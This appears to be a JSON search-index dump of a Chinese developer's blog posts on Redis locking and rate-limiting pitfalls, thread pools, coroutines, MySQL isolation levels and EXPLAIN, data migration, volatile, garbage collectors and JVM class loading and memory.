弊端就是只能限制同个进程的缓存更新。 3. redis分布式锁。值得注意的是低版本的redis，setNx与expire是二步操作，不能保证原子性，下面提供一个高版本的redis,setNx可以设置过期时间的。 public String get(key) { String value = redis.get(key); if (value == null) { //代表缓存值过期 //设置3min的超时，防止del操作失败的时候，下次缓存过期一直不能load db String keynx = key.concat(“:nx”); if (redis.setnx(keynx, 1, 3 * 60) == 1) { //代表设置成功 value = db.get(key); redis.set(key, value, expire_secs); redis.del(keynx); } else { //这个时候代表同时候的其他线程已经load db并回设到缓存了，这时候重试获取缓存值即可 sleep(50); get(key); //重试 } } else { return value; }}`","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"缓存","slug":"缓存","permalink":"http://www.hasfun.cn/tags/缓存/"}]},{"title":"用协程代替线程,减少上下文切换","slug":"如何减少上下文切换","date":"2019-05-02T09:34:40.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/05/02/如何减少上下文切换/","link":"","permalink":"http://www.hasfun.cn/2019/05/02/如何减少上下文切换/","excerpt":"","text":"背景在开发工作中，遇到一些串行处理比较耗时的任务，我会想到用多线程，切片并行执行，已减少请求响应时间，提高吞吐量。可是，开辟线程也是需要消耗系统内存的，一个线程的线程栈，JVM默认配置1M左右，线程栈的内存的上限 只受操作系统的内存限制，所以线程创建过多，会在JVM的LOG日志看到这一行 java.lang.OutOfMemoryError: unable to create new native thread ，通常我们使用的线程池来管理和监控线程,使用线程池注意的地方参考线程池容易被忽略的地方。 话说回来，我们创建线程，就能提高性能吗？创建线程数一般根据CPU的个数来设置的。**一个CPU只会同时支持一个线程运行，CPU根据分配的时间片（单位几十MS）运行该线程，到了这个时间片后，有二种情况： 这个线程任务执行完了，则释放CPU 这个线程的任务还没有执行完，则CPU也会强行释放服务其他线程了，并将该线程塞到等待队列等待下次调度，在很短的时间后该线程又获得了CPU调度，CPU根据上次的状态（对应JVM的谈到的程序计数器），继续执行下去，这一个周期叫做上下文切换**，由此可见CPU上下文切换影响线程执行效率。 如何定量分析上下文切换次数呢？Linux提供了性能检测工具，使用vmstat可以测量上下文切换的次数。 root@ubuntu:~# vmstat 2 1 第一个参数是采样的时间间隔数，单位是秒 第二个参数是采样的次数 运行后有如下参数： r b swpd free buff cache si so bi bo in cs us r表示运行队列(就是说多少个进程真的分配到CPU)，当这个值超过了CPU数目，就会出现CPU瓶颈了。如果运行队列过大，表示你的CPU很繁忙，一般会造成CPU使用率很高。 cs每秒上下文切换次数，线程的切换，也要进程上下文切换，这个值要越小越好，太大了，要考虑调低线程或者进程的数目，上下文切换次数过多表示你的CPU大部分浪费在上下文切换，导致CPU干正经事的时间少了，CPU没有充分利用，是不可取的。 那么如何减少上下文切换呢？ 可以想到的是，增加CPU，当然增加了硬件的成本，老板不同意的。 另一个容易就是想到的，减少线程数，这个只能视业务而定。 再一个就是无锁编程，锁会增大线程上下文切换的次数。 还有一个该提到的就是CAS，JDK里原子类和并发包都有应用。 最后提到的是，用协程代替线程。 那么什么是协程呢？协程跟线程的用法相似，对于我们JAVA党不熟悉，但在golang,kotlin 1.30，python:都有原生的支持了。具体用法参考聊一聊 Java-协程 那些事,我目前的水平还达不到解说，值得提的是如下几点： 对于那些需要CPU长时间计算的代码，很少遇到阻塞的时候，就应该首选thread。 当代码经常会被等待其它资源的阻塞的时候，就应该使用协程 附录操作系统——CPU调度从 synchronized 到 CAS 和 AQS - 彻底弄懂 Java 各种并发锁Linux vmstat命令实战详解","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"协程","slug":"协程","permalink":"http://www.hasfun.cn/tags/协程/"}]},{"title":"线程池容易被忽略的地方","slug":"线程池容易被忽略的地方","date":"2019-04-30T06:30:24.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/04/30/线程池容易被忽略的地方/","link":"","permalink":"http://www.hasfun.cn/2019/04/30/线程池容易被忽略的地方/","excerpt":"","text":"为什么用线程池？ 节约省资源创建线程有损耗，销毁线程也有损耗 执行效率高充分利用多核CPU，并行处理。处理任务，不需要等待线程创建的过程立即执行。 管理线程线程是操作系统稀缺的资源，不可滥用。线程池可以做到统一分配，调优和监控。 线程池的实现原理任务请求过来，当前线程数小于核心线程池线程数，创建线程执行；当前线程数大于等于核心线程数，则放到队列等待空闲线程处理。当任务队列满了，则创建线程，执行任务。当线程池的最大线程数都繁忙，则走拒绝策略。 注意 这里有个核心线程池，与线程池的概念 核心线程池的线程没有初始化创建完，而不会用核心线程池空闲线程执行新来的任务，而是优先创建线程 思考 当线程池当前线程数已经大于核心线程数，这时候线程池也已经空闲了一段时候，非核心线程已经消亡， 这个时候新请求过来一个任务，这时候线程池是新建一个线程处理，还是将线程放入队列中， 又或者用核心线程去处理 如何优雅关闭线程池shutdown与shutdownNow，都无法保证100%关闭线程池的线程。shutdownNow将所有工作线程中断，并返回还没完成的任务集isShutDown() 当执行了上面二个命令，则返回trueisTerminaed() 判断线程是否全部终止，线程池完美关闭。 如何合理配置线程池根据任务的特性分几个方面： 任务的性质IO密集的任务，2Ncpu 个线程数CPU计算密集的任务，Ncpu+1 个线程数混合型的任务，则看情况，将任务分成IO密集和CPU密集的分别执行，如果二者执行时间相差不大，则没必要。 任务的执行的时间长短让执行时间短的先行 任务的优先级使用优先级队列，注意会导致优先级不高的永远不执行。 任务的依赖性是否依赖其他资源，比如数据库，Redis，第三方。2Ncpu 个线程数执行。 线程池监控可以利用线程池里面提供的参数监控： /** * 线程池里曾经创建过的最大线程数量。通过这个数据可以知道线程池是否曾经满过 */ private int largestPoolSize; /** * 线程池在运行过程中已完成的任务数量，小于或等于taskCount */ private long completedTaskCount; /** * 线程池需要执行的任务数量 */ public long getTaskCount() {} /** * 线程池的线程数量。如果线程池不销毁的话， * 线程池里的线程不会自动销毁,所以这个大小只增不减 */ public int getPoolSize() {} 重写线程池的beforeExecute、afterExecute和terminated方法，也可以在任务执行前、执行后和线程池关闭前执行一些代码来进行监控。 思考：getPoolSize（）线程池的线程数量。如果线程池不销毁的话，线程池里的线程不会自动销毁,所以这个大小只增不减。这句话，没那么绝对。线程池中工作线程销毁的条件： 1) 参数allowCoreThreadTimeOut为true 2) 该线程在keepAliveTime时间内获取不到任务，即空闲这么长时间 3) 当前线程池大小 &gt; 核心线程池大小corePoolSize long keepAliveTime该线程池中非核心线程闲置超时时长 一个非核心线程，如果不干活(闲置状态)的时长超过这个参数所设定的时长，就会被销毁掉 另外默认对非核心线程有效，若想核心线程也适用于这个机制， 可以调用allowCoreThreadTimeOut()方法。这样的话就没有核心线程这一说了。 线程池的队列ArrayBlockingQueue数组有界队列LinkedBlockingQueue链表无界队列 Executors.newFixedThreadPool()PriorityBlockingQueue优先级无界队列SynchronousQueue不保留任务的队列 Executors.newCachedThreadPoolDelayQueue 延迟队列 附录你真的懂ThreadPoolExecutor线程池技术吗？看了源码你会有全新的认识深入理解线程池原理篇","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"线程池","slug":"线程池","permalink":"http://www.hasfun.cn/tags/线程池/"}]},{"title":"Redis incr做接口访问频率的坑","slug":"Redis-incr做接口访问频率的坑","date":"2019-04-29T12:27:33.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/04/29/Redis-incr做接口访问频率的坑/","link":"","permalink":"http://www.hasfun.cn/2019/04/29/Redis-incr做接口访问频率的坑/","excerpt":"","text":"背景在互联网高并发的分布式系统中，我们需要对接口限流，我会用Redis的incr命令，如果是单机的话，用Guava的RateLimiter就可以了。 前置知识INCRBY key increment redis&gt; SET page_view 20 OK redis&gt; INCR page_view (integer) 21 redis&gt; GET page_view # 数字值在 Redis 中以字符串的形式保存 &quot;21&quot; 这里需要注意的是:为键 key 储存的数字值加上增量 increment 。如果键 key 不存在， 那么键 key 的值会先被初始化为 0 ， 然后再执行 INCRBY 命令。。 redis&gt; TTL key 当 key 不存在时，返回 -2 。 当 key 存在但没有设置剩余生存时间时，返回 -1 。 否则，以秒为单位，返回 key 的剩余生存时间。 现象我实现一个功能，限制一分钟内，接口的访问频率是100次，于是写出如下的代码 Jedis redis = getRedis(); try { Long count = redis.incrBy(key, 1); redis.expire(key,60); if (count &gt; maxAllowedTimes) { return false; }else{ return true; } } finally { redis.close(); } 这里设置KEY过期时间为60s内，KEY由1开始递增，当KEY超过阈值，则请求不给通过，看起来，没有问题。其实这里的问题出在上一篇Redis执行expire命令失败引发的坑提到的，如果redis.expire(key,60)执行失败了，那么KEY就遗留在内存里面，失去了“60s内限流的作用”。 网上Google了下“Redis 坑”，列举了好几页，redis要慎用啊。比如： Jedis redis = getRedis(); try { redis.set(SafeEncoder.encode(key), SafeEncoder.encode(def + &quot;&quot;), &quot;nx&quot;.getBytes(), &quot;ex&quot;.getBytes(), exp); Long count = redis.incrBy(key.getBytes(), val); } finally { redis.close(); } 这段代码，如果KEY在失效时间内执行set,发现KEY已经存在，则不设置过期时间，刚好在执行set, incrBy 之间过期了，那么这个KEY就一直存在了。 还有一位老兄这样写： Jedis jedis = RedisUtils.getJedis(); String requestKey = Times + &quot;:&quot; + ID + &quot;:&quot; + getId(); if (jedis.exists(requestKey)) { //如果这里KEY过期 jedis.incr(requestKey); String times = jedis.get(requestKey); if (StringUtil.strIsNotEmpty(times)){ if (Long.parseLong(times) &gt; maxAllowedTimes) { jedis.del(requestKey); return true; } } } else { jedis.set(requestKey, &quot;1&quot;); jedis.pexpire(requestKey,REQUEST_EXIT_MILLISECONDS); 如果上述代码在KEY有效期执行，在标注的地方刚好失效，则执行incr，设置KEY为0，永久有效。 解决方案TTL校验过期时间，如果没set expire成功重新重试6次，还是失败，则发给MQ，后续再做处理 try (Jedis redis = getRedis()) { Long count = redis.incrBy(key.getBytes(), val); if (count == val) { try{ redis.expire(key, exp); }catche(Exception e){ redis.expire(key, exp); }finally{ if(redis.ttl(key)==-1){ try{ redis.expire(key, exp); }finally{ sendMQ(key);##发送给MQ，接着消费处理 } } } } }","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://www.hasfun.cn/tags/Redis/"}]},{"title":"Redis执行expire命令失败引发的坑","slug":"Redis执行expire命令失败引发的坑","date":"2019-04-28T14:12:22.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/04/28/Redis执行expire命令失败引发的坑/","link":"","permalink":"http://www.hasfun.cn/2019/04/28/Redis执行expire命令失败引发的坑/","excerpt":"","text":"背景在我们做系统开发的时候，遇到高并发的场景，我们对一些数据会直接借助Redis存储，又或者借助Redis实现分布式锁，它带给我们很多的好处，同时我们在使用的时候，会遇到很多的坑，接下来，是我面试的时候遇到的一个问题，我平时一直没意识到。 给KEY设置过期时间，如下 EXPIRE key seconds 我们系统Redis通过集群，实现HA，可是也难免会因为网络抖动，又或者Redis达到瓶颈，EXPIRE/DELETE 这样的操作，可能会失败，导致的后果就是Redis残留无效KEY。那么日积月累。。。 前置知识 给定 key 的剩余生存时间 redis&gt; TTL key Redis分布式锁 Redis分布式锁在2.6.12版本之后的实现方式比较简单，只需要使用一个命令即可： SET key value [EX seconds] [NX] 这个命令相当于2.6.12之前的setNx和expire两个命令的原子操作命令 GETSET key value redis&gt; GETSET db mongodb # 没有旧值，返回 nil (nil) redis&gt; GET db &quot;mongodb&quot; redis&gt; GETSET db redis # 返回旧值 mongodb &quot;mongodb&quot; redis&gt; GET db &quot;redis&quot; 将键 key 的值设为 value ， 并返回键 key 在被设置之前的旧值 如何解决当时，因为知识体系里面没有这个东西，没有答出来。今天回头想想，翻了一下《Redis实战》，里面有提到这个， 为了确保锁在客户端已经崩溃（客户端在执行介于SETNX与EXPIRE之间的时候崩溃是最糟糕的）的情况下仍然能够自动被释放，客户端会在尝试获取锁失败之后，检查锁的超时时间，并为未设置超时时间的锁设置超时时间。 那么如果第二次EXPIRE又失败了，怎么办？我想到的方案是，重试5次，还失败的话，将失败的KEY,放入MQ等待下次消费。 Redis分布式锁，如果EXPIRE失败，导致死锁通过上面，我们也知道了不能依赖EXPIRE让KEY失效。Redis在分布式锁上，更不能依赖EXPIRE释放锁，网上借鉴来的比较稳妥的方法如下 public booelan getLock(String lockKey) { boolean lock = false; while (!lock) { String expireTime = String.valueOf(System.currentTimeMillis() + 5000); // (1)第一个获得锁的线程，将lockKey的值设置为当前时间+5000毫秒，后面会判断，如果5秒之后，获得锁的线程还没有执行完，会忽略之前获得锁的线程，而直接获取锁，所以这个时间需要根据自己业务的执行时间来设置长短。 lock = shardedXCommands.setNX(lockKey, expireTime); if (lock) { // 已经获取了这个锁 直接返回已经获得锁的标识 return lock; } // 没获得锁的线程可以执行到这里：从Redis获取老的时间戳 String oldTimeStr = shardedXCommands.get(lockKey); if (oldTimeStr != null &amp;&amp; !&quot;&quot;.equals(oldTimeStr.trim())) { Long oldTimeLong = Long.valueOf(oldTimeStr); // 当前的时间戳 Long currentTimeLong = System.currentTimeMillis(); // (2)如果oldTimeLong小于当前时间了，说明之前持有锁的线程执行时间大于5秒了，就强制忽略该线程所持有的锁，重新设置自己的锁 if (oldTimeLong &lt; currentTimeLong) { // (3)调用getset方法获取之前的时间戳,注意这里会出现多个线程竞争，但肯定只会有一个线程会拿到第一次获取到锁时设置的expireTime String oldTimeStr2 = shardedXCommands.getSet(lockKey, String.valueOf(System.currentTimeMillis() + 5000)); // (4)如果刚获取的时间戳和之前获取的时间戳一样的话,说明没有其他线程在占用这个锁,则此线程可以获取这个锁. if (oldTimeStr2 != null &amp;&amp; oldTimeStr.equals(oldTimeStr2)) { lock = true; // 获取锁标记 break; } } } // 暂停50ms,重新循环 try { Thread.sleep(50); } catch (InterruptedException e) { log.error(e); } } return lock; } 参考Redis在京东到家的订单中的使用","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://www.hasfun.cn/tags/Redis/"},{"name":"面试","slug":"面试","permalink":"http://www.hasfun.cn/tags/面试/"}]},{"title":"源码阅读利器-UML类图","slug":"uml","date":"2019-04-27T15:34:23.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/04/27/uml/","link":"","permalink":"http://www.hasfun.cn/2019/04/27/uml/","excerpt":"","text":"预备知识为什么要有类图？类图(Class diagram)主要用于描述系统的结构化设计。类图也是最常用的UML图，用类图可以显示出类、接口以及它们之间的静态结构和关系。 领域UML类图 VS 实现UML类图通常在软件需求分析的时候，产品设计师需画一份领域UML类图，设计阶段，研发会画一份实现UML类图，二者还是有区别的。 读懂UML 类继承 注：最终代码中，泛化关系表现为继承非抽象类 接口实现 注：最终代码中，实现关系表现为继承抽象类； 聚合关系 如下图表示A聚合到B上，或者说B由A组成； public class WildGooseAggregate { private List&lt;WildGoose&gt; wideGooses; } 组合关系 public class Bird { private Wing wing; public Bird() { wing = new Wing(); } } 组合关系是一种强依赖的特殊聚合关系，如果整体不存在了，则部分也不存在了；例如， 公司不存在了，部门也将不存在了； 关联关系 public class Penguin { private Climate climate; } 注：在最终代码中，关联对象通常是以成员变量的形式实现的； 依赖关系 public class Programmer{ public void work(Computer computer) { } } 注：在最终代码中，依赖关系体现为类构造方法及类方法的传入参数，箭头的指向为调用关系；依赖关系除了临时知道对方外，还是“使用”对方的方法和属性；","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"UML","slug":"UML","permalink":"http://www.hasfun.cn/tags/UML/"}]},{"title":"如何平滑数据迁移不影响服务的可用性","slug":"面试","date":"2019-04-26T14:33:20.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/04/26/面试/","link":"","permalink":"http://www.hasfun.cn/2019/04/26/面试/","excerpt":"","text":"今天去壹钱包面试，问了一些解决方案，被有道题目难住了。 业务场景 有个用户基础信息表，注册的时候，用户的手机号当前是明文保存在db，用户信息泄露的问题影响是不能容忍的，安全部要求把这个明文手机号改成密文，但是我们号称是24*7小时全天服务的公司，为保证系统可用性，请出个方案，平滑的将明文数据改成密文数据。 初看这道题，觉得很简单。这里涉及到新老数据共存的问题。我当时提出的方案是这样的： 老用户数据加个是否加密的标示。新用户直接执行加密，存db。老用户查询的时候用明文，查询完，将明文转成秘文，更新到db并且标志位更新成秘文。再加个补偿任务，降漏掉的明文改成秘文。 无疑，太粗暴了。当系统发布的过程中，原逻辑代码的实例与加密的新实例，如果收到并发的2个同样手机的请求来，会导致重复手机号注册的问题。当时没有思绪，面试官让我回家想。。。 后来回到家，经过跟瑞强讨论，拿到了如下的解决方案。 时间换空间 分四步 1：加另一张表，跟原来表结构一样，用于存密文。 2：然后代码增加一个同步数据的功能，将明文转成密文同步到新表去。 然后新代码发布的过程中，老代码的服务可能存在的情况就是没有把数据同步到新表去， 新代码的数据 老表跟新表都有。 3：然后等待系统发布稳定后，再写个脚本将旧表数据 加密同步到新表去。 4：切换业务代码到新表，删除旧表 我回复了面试的答案，面试官说，也是一种思路。他用一句话总结：“两个表双写是一个思路，本质上就是新老不能混在一起，为达到这个目的手段可以有多个” 2019/4/28 这二天，看了下架构方便的博客，看到了58沈剑的文章有提到这块关于“100亿数据平滑数据迁移,不影响服务”的介绍,才明白，上面提到的解决方案，名叫“双写法”，这个方案是不完善的，体现在：数据迁移后，先写个校对数据校验工具保证新旧表的数据一致性，再切新表。 在一个极端的情况下，在数据迁移过程中，当提取旧表的某一条记录A，准备迁移到新表，这时候旧表进行了delete A的操作，这时候双写的时候，新表还没有A的记录，这就导致了新表多了一条数据，所以数据校对一致性工具还是必要的。 另外学到了另外一套新的迁移方法，个人觉得比较麻烦。追日志法，可以看下这篇文章的介绍。","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"面试","slug":"面试","permalink":"http://www.hasfun.cn/tags/面试/"},{"name":"数据迁移","slug":"数据迁移","permalink":"http://www.hasfun.cn/tags/数据迁移/"}]},{"title":"MYSQL事务默认隔离级别为什么是可重复读","slug":"mysql隔离级别","date":"2019-04-25T14:27:57.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/04/25/mysql隔离级别/","link":"","permalink":"http://www.hasfun.cn/2019/04/25/mysql隔离级别/","excerpt":"","text":"预备知识ACID是做什么的简而言之，解释为 原子性（atomicity） 一致性（consistency） 隔离性（isolation） 持久性（durability） 为保证数据库事务操作的正确性与可靠性，必须满足以上4个特性。 事务隔离级别跟ACID有啥关系上面ACID的4个特性中，其他三个都是针对单一事务，当出现并行事务的时候，就会存在以下几个问题： 脏读 不可重复读 幻读 数据库是怎么解决这个问题的呢？简而言之，加锁。数据库提供了自动锁的功能，只需要用户指定会话的事务隔离级别，数据库就会分析SQL然后给事务访问的资源加入合适的锁。 事务隔离级别有以下 读未提交(Read UnCommitted) 读已提交(Read Commited，后面简称RC) 可重复读(Repeatable Read，后面简称RR) 序列化读(Serializable) binlog的几种格式 statement:记录的是修改SQL语句 row：记录的是每行实际数据的变更 ，RC隔离级别下使用的binlog格式 mixed：statement和row模式的混合 MySQL事务默认隔离级别RR我们知道，Oracal默认隔离级别是RC， Mysql默认隔离级别是RR，可不可以换成其他的？数据库主从同步的方式是怎么样， 是通过binlog。Mysql 5.0版本之前，binlog只支持STATEMENT这种格式。而这种格式在RC隔离级别下主从同步是有bug的。因此Mysql将RR作为默认的隔离级别！ 互联网项目中mysql应该选什么事务隔离级别？由上面我们知道了，mysql默认是可重复读的原因，那么我们可以升级Mysql到5,1即可以解决，互联网项目大部分用的是RC，为什么？ 可重复读存在GAP锁，死锁的概率相对读已提交大 在RR隔离级别下，条件列未命中索引会锁表！而在RC隔离级别下，只锁行","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"http://www.hasfun.cn/tags/Mysql/"},{"name":"隔离级别","slug":"隔离级别","permalink":"http://www.hasfun.cn/tags/隔离级别/"}]},{"title":"SQL优化神器explain","slug":"SQL优化神器explain","date":"2019-04-20T12:20:06.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/04/20/SQL优化神器explain/","link":"","permalink":"http://www.hasfun.cn/2019/04/20/SQL优化神器explain/","excerpt":"","text":"SQL优化，离不开explain。这里记下explain的常用列，方便以后查询。 这里提2个关键关于查询效率的列 type列 | ALL | 全表扫描 | index | 索引全扫描 | range | 索引范围扫描，常用语&lt;,&lt;=,&gt;=,between等操作 | ref | 使用非唯一索引扫描或唯一索引前缀扫描，返回单条记录，常出现在关联查询中 | eq_ref | 类似ref，区别在于使用的是唯一索引，使用主键的关联查询 | const/system | 匹配单条记录，系统会把匹配行中的其他列作为常数处理，如主键或唯一索引查询 | null | MySQL不访问任何表或索引，直接返回结果 sql效率从上到下逐渐增高 Extra列 | Using index | 表示使用索引 如果只有 Using index，说明他没有查询到数据表，只用索引表就完成了这个查询，这个叫覆盖索引。如果同时出现Using where，代表使用索引来查找读取记录，也是可以用到索引的，但是需要查询到数据表。 | Using where | 表示条件查询 不读取表的所有数据，或不是仅仅通过索引就可以获取所有需要的数据，则会出现 Using where。 | Using filesort | 排序语句ORDER BY的时候，会出现该信息。 | Using temporary | 使用了临时表，多表联合查询，结果排序的场合。 sql效率从上到下逐渐增高","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"http://www.hasfun.cn/tags/Mysql/"}]},{"title":"volatile 必备知识","slug":"volatile与synchronized的区别","date":"2019-04-18T15:41:27.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/04/18/volatile与synchronized的区别/","link":"","permalink":"http://www.hasfun.cn/2019/04/18/volatile与synchronized的区别/","excerpt":"","text":"前置知识JMM虚拟机线程内存模型: 每个线程，都是在自己的工作内存里面操作，想与另外一个线程共享变量值，需要将工作内存的变量刷到主内存，其他线程从主内存复制一份到工作线程来取值。 区别volatile 保证了线程之间的可见性和有序性,但不具备原子性。被volatile修饰的变量，线程每次取值都会 从主内存复制到工作内存。 synchronized 解释成JVM指令码 就是monitorenter 和 monitorexit控制线程同步 保证了线程的可见性、有序性和原子性。synchronized的锁来自 对象头的锁，即MarkWord存放的锁标志。 这里容易混淆的是 synchronized有序性，不代表能防止指令重排序，有序性的含义是代表保证线程执行的有序性，也只有volatile才有指令内存屏障，所以双重检锁的单例模式，用了volatile修饰instance，防止new instance()的非原子性操作的指令重排序，导致拿到null的单例。 2019-5-11 今天20:00饿了么蜂鸟配送的面试官电面了我，问了这块知识，原来这里可以有这么多东西可以问。 volatile怎么保证线程的可见性，一个线程的变量变更，另一个线程是怎么感知的？JVM内存模型对volatile修饰的变量，定义了几个特殊规则： 线程在工作内存中，使用该变量的时候，需要从主内存刷新到工作内存去。 线程修改了工作内存的变量值，需要刷新到主内存去，供其他线程使用。 为什么JVM将内存分为工作内存与主内存，即为什么有栈和堆主内存是线程共享的，不具有线程安全性，而工作内存是线程独有的，具有隔离性，线程安全工作内存即CPU的高速缓存，为了执行效率高。 volatile有哪些场景的应用 用于一些开关标识的场景（我只知道这个） 用于缓存的更新的场景，比如缓存失效的时候，多个线程并发获取该缓存，只允许一个线程去DB，拉取数据后塞进缓存后，供其他线程可见使用。 单例模式中，声明单例为volatile。","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"volatile","slug":"volatile","permalink":"http://www.hasfun.cn/tags/volatile/"},{"name":"synchronized","slug":"synchronized","permalink":"http://www.hasfun.cn/tags/synchronized/"}]},{"title":"垃圾回收器的选择","slug":"gc","date":"2019-04-06T11:50:23.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/04/06/gc/","link":"","permalink":"http://www.hasfun.cn/2019/04/06/gc/","excerpt":"","text":"其实，要不是读周志明的《深入理解java虚拟机》，垃圾回收器这个东西，我工作中是不需要接触到的。既然学习了，我就得沉淀点东西，以供后续复习。那么有这本书详细的描述了这块的知识，还需要我写点什么呢？恩，据我了解，周围同事读过这本书感受，都不是很流畅，读完有点懵，也记不住读过的内容，我要做的就是对知识的解剖的有条理性。肉是肉，骨头是骨头，码的整整齐齐。 前置知识吞吐量: CPU用于运行用户代码的时间与CPU总消耗时间的比值，即吞吐量=运行用户代码时间/（运行用户代码时间+垃圾收集时间），虚拟机总共运行了100分钟，其中垃圾收集花掉1分钟，那吞吐量就是99%。 并行（Parallel）: 指多条垃圾收集线程并行工作，但此时用户线程仍然处于等待状态。 并发（Concurrent）: 指用户线程与垃圾收集线程同时执行（但不一定是并行的，可能会交替执行），用户程序在继续运行，而垃圾收集程序运行于另一个CPU上。 垃圾回收器分类按照回收线程数分：1、串行垃圾回收器 serial 收集器，serial old 收集器 2、并行垃圾回收器 parNew收集器，Parallel Scavenge，parallel old 按照工作模式划分1、独占式垃圾回收器 serial 收集器，serial old 收集器，parNew收集器，Parallel Scavenge，parallel old 2、并发式垃圾回收器 cms 按照工作的内存区间划分：1、新生代 serial， parNew， Parallel Scavenge 2、老生代 serial old， parallel old， cms 按照碎片处理方式划分压缩式垃圾回收器 CMS收集器 CMS收集器提供了 -XX:+UseCMSCompactAtFullCollection开启碎整理 -XX:CMSFullGCsBeforeCompaction，设置执行多少次不压缩的FullGC后，跟着来一次带压缩的 非压缩式垃圾回收器 serial 收集器，serial old 收集器，parNew收集器，Parallel Scavenge，parallel old 按照回收算法1、标记 清除 cms 2、复制 serial ，parNew， parallel scavenger 3、标记 整理 serial old， parallel old 最佳实践Parallel Scavenge收集器无法与CMS收集器配合工作 最佳搭配： ParNew + CMS（GC停顿时间短）， Parallel Scavenge+Parallel Old（吞吐量高）","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"GC","slug":"GC","permalink":"http://www.hasfun.cn/tags/GC/"}]},{"title":"类的加载机制与对象的实例化","slug":"jvm-class","date":"2019-03-26T12:15:42.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/03/26/jvm-class/","link":"","permalink":"http://www.hasfun.cn/2019/03/26/jvm-class/","excerpt":"","text":"今天读到周志明的《深入理解java虚拟机》中类加载机制与对象的实例化这块，这本书说实话，还是有点生涩难懂，不过老祖先有祖训：“书读百遍，其义自见”，这句话是对的，我也是时隔2年，重新拜读的。 前置知识点成员变量与静态变量的区别静态变量 别名 类变量；成员变量 别名 实例变量类的静态方法和静态变量属于类，作为类型数据保存在方法区，其生命周期取决于类，而实例方法和字段位于Java堆，其生命周期取决于对象的生命周期。 类初始化与类实例化的区别类的初始化是指虚拟机加载CLASS文件到内存中，将Class文件解析成JVM理解的执行指令，将类变量指定初始值，和类的函数方法等存入方法区，将class文件的符号引用转成方法区的直接引用。类初始化之后就可以访问类的静态字段和方法，而访问类的非静态(实例)字段和方法，就需要创建类的对象实例，故类的实例化是在类的初始化之后，是在堆上创建一个该类的对象 类加载过程 装载（加载class解释成虚拟机的方法区的运行期数据结构） 验证（解析class文件合法性） 准备(类变量设初始值，而非实例变量) 解析（符号引用转成直接引用） 初始化（类变量与static语句初始化） 使用、卸载 类的实例化 虚拟机接受new指令， 类加载过程，父类静态变量与静态方法块执行完毕，子类静态变量与静态方法执行完毕 再执行父类的实例变量与构造方法，最后执行子类的实例化变量与构造方法 举例 public abstract class ObjectCreateAEx { ObjectCreateAEx(){ int a = getAV(); System.out.println(a); } public abstract int getAV(); } public class ObjectCreateBEx extends ObjectCreateAEx{ private int a = 10; private static int b = 11; private static final int c = 12; ObjectCreateBEx(int a){ a = a; } @Override public int getAV() { return a; } public static void main(String[] args) { ObjectCreateBEx aEx = new ObjectCreateBEx(100); } } 计算打印的结果是：0。为什么?因为类初始化的是静态变量b，而a是在实例化后才赋值成10的,类实例化的过程是，先构造函数，再实例变量赋值。所以父类构造函数调用子类的变量，取得是子类还未赋值的初始化变量 附录示例代码","categories":[{"name":"技术","slug":"技术","permalink":"http://www.hasfun.cn/categories/技术/"}],"tags":[{"name":"类的加载机制","slug":"类的加载机制","permalink":"http://www.hasfun.cn/tags/类的加载机制/"}]},{"title":"JVM进程占用内存过高排查","slug":"jvmerror","date":"2019-03-22T14:54:21.000Z","updated":"2021-09-18T11:16:25.092Z","comments":true,"path":"2019/03/22/jvmerror/","link":"","permalink":"http://www.hasfun.cn/2019/03/22/jvmerror/","excerpt":"","text":"基础知识32位的系统 进程内存限制最多2G？32 位寻址空间只有 4GB 大小，于是 32 位应用程序进程最大只能用到 4GB 的内存。然而，除了应用程序本身要用内存，操作系统内核也需要使用。应用程序使用的内存空间分为用户空间和内核空间，每个 32 位程序的用户空间可独享前 2GB 空间（指针值为正数），而内核空间为所有进程共享 2GB 空间（指针值为负数）。所以，32 位应用程序实际能够访问的内存地址空间最多只有 2GB。 JVM进程崩溃？1, 当超出JVM的分配的内存时，JAVA进程并不会退出只是结束当前的线程2, 当服务器内存不够时，linux杀死使用内存的一个进程3, 把系统拆分成多个服务部署在同一台机时需要特别注意，JVM启动时分配的内存只是申请（其实体现在VIRT），当一台服务器运行多个JAVA进程时请保留足够的可用内存 (大于分配给各个JVM的进程之和) TOP命令参数VIRT 虚拟内存中含有共享库、共享内存、栈、堆，所有已申请的总内存空间。RES 是进程正在使用的内存空间(栈、堆)，申请内存后该内存段已被重新赋值。SHR 是共享内存正在使用的空间。SWAP 交换的是已经申请，但没有使用的空间，包括(栈、堆、共享内存)。DATA 是进程栈、堆申请的总空间。 linux内存和JAVA堆中的关系JAVA进程内存 = JVM进程内存+heap内存+ 永久代内存+ 